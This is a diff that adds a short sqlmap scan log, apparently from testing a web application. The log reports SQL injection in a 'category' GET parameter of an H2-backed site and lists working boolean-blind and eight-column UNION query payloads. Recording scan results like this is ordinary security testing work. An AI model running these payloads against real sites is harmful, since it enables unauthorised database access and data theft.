@@ -1,0 +1,12 @@
+sqlmap identified the following injection point(s) with a total of 31 HTTP(s) requests:
+---
+Parameter: category (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: category=Juice' AND 8539=8539-- cnXj
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: category=Juice' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CHAR(113)||CHAR(122)||CHAR(106)||CHAR(106)||CHAR(113)||CHAR(105)||CHAR(104)||CHAR(80)||CHAR(77)||CHAR(98)||CHAR(102)||CHAR(119)||CHAR(84)||CHAR(89)||CHAR(77)||CHAR(102)||CHAR(90)||CHAR(121)||CHAR(104)||CHAR(73)||CHAR(119)||CHAR(101)||CHAR(122)||CHAR(104)||CHAR(89)||CHAR(108)||CHAR(84)||CHAR(73)||CHAR(86)||CHAR(86)||CHAR(115)||CHAR(103)||CHAR(76)||CHAR(115)||CHAR(65)||CHAR(113)||CHAR(118)||CHAR(84)||CHAR(67)||CHAR(110)||CHAR(110)||CHAR(74)||CHAR(116)||CHAR(120)||CHAR(87)||CHAR(113)||CHAR(106)||CHAR(113)||CHAR(118)||CHAR(113),NULL,NULL-- pcjQ
+---
+back-end DBMS: H2
